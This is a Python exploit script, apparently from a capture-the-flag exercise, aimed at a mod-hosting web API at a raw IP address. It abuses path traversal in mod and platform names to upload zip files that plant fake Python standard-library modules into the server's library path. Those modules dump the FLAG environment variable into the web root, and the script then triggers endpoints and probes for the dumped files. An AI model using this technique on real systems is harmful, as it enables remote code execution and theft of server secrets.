import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = "http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

tok,u=fresh()
mods = ["pkgutil","importlib","runpy","codecs","unicodedata","stringprep","marshal","linecache",
        "inspect","traceback","warnings","contextlib","abc","functools","itertools","operator",
        "site","statistics","bisect","heapq","array","mmap","fcntl","selectors","asyncio"]
files={}
for m in mods:
    files[m+".py"]=f'import os\nopen("/usr/share/nginx/html/br_{m}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
pid=pf.create_platform(tok,"lib/python3.11",name="z"); mid=pf.create_mod(tok,"../../../usr/local",title="z"); bid=pf.create_build(tok,mid,pid)
r=pf.upload_zip(tok,mid,bid,files)
print("plant",len(files),"->",r.status_code, r.text[:60])
h={"Authorization":f"Bearer {tok}"}
# trigger untriggered endpoints + re-trigger common
lg=requests.post(f"{BASE}/api/auth/login/",json={"username":u,"password":"pass12345"},timeout=10).json()
requests.post(f"{BASE}/api/auth/token/refresh/",json={"refresh":lg.get("refresh","")},timeout=10)
requests.get(f"{BASE}/api/auth/me/",headers=h,timeout=10)
requests.get(f"{BASE}/api/schema/",timeout=10)
requests.get(f"{BASE}/api/docs/",timeout=10)
requests.get(f"{BASE}/media/builds/2.4.1/win4794/real.txt",timeout=8)
# PATCH a mod (create own then patch)
mid2=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z")
requests.patch(f"{BASE}/api/mods/%d/"%mid2,headers=h,json={"title":"patched"},timeout=10)
# DELETE a platform
pid2=pf.create_platform(tok,"d%d"%random.randint(0,9999),name="z")
requests.delete(f"{BASE}/api/platforms/%d/"%pid2,headers=h,timeout=10)
time.sleep(2)
fired=[]
for m in mods:
    c=requests.get(f"{BASE}/br_{m}",timeout=6)
    if c.status_code==200 and "doctype" not in c.text[:40].lower():
        fired.append((m, c.text[:60]))
print("FIRED:",fired)
